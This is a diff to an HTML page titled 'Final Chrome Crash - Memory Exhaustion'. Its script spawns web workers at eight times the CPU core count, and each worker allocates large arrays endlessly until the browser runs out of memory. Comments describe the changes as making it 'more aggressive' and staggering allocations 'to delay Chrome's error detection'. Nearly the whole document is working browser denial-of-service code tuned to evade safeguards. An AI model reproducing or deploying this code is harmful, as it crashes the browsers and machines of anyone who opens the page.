@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Chrome Crash - Reliable Version</title>
+    <title>Final Chrome Crash - Memory Exhaustion</title>
 </head>
 <body>
-    <h1>Final Test - Maximum Chrome Crash</h1>
+    <h1>Final Chrome Crash - Memory Exhaustion</h1>
     <p>Open 12+ tabs for best results.</p>
 
     <script>
         function startWorker() {
-            let code = `let data = []; while (true) { data.push(new Float64Array(1e8)); }`; 
+            let code = `
+                let data = [];
+                function allocate() {
+                    for (let i = 0; i < 50; i++) { // Allocating in smaller blocks
+                        data.push(new Float64Array(5e6)); // More frequent, fragmented allocations
+                    }
+                    setTimeout(allocate, 100); // Staggered execution to delay Chrome's error detection
+                }
+                allocate();
+            `;
             let blob = new Blob([code], { type: "application/javascript" });
             let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        let coreMultiplier = navigator.hardwareConcurrency * 6; // Adjusted to 6x CPU cores for stronger execution
+        let coreMultiplier = navigator.hardwareConcurrency * 8; // Increased to 8x CPU cores
         for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 100); // Minimal delay for rapid overload
+            setTimeout(startWorker, i * 50); // More aggressive spawning with slight delay
         }
     </script>
 </body>
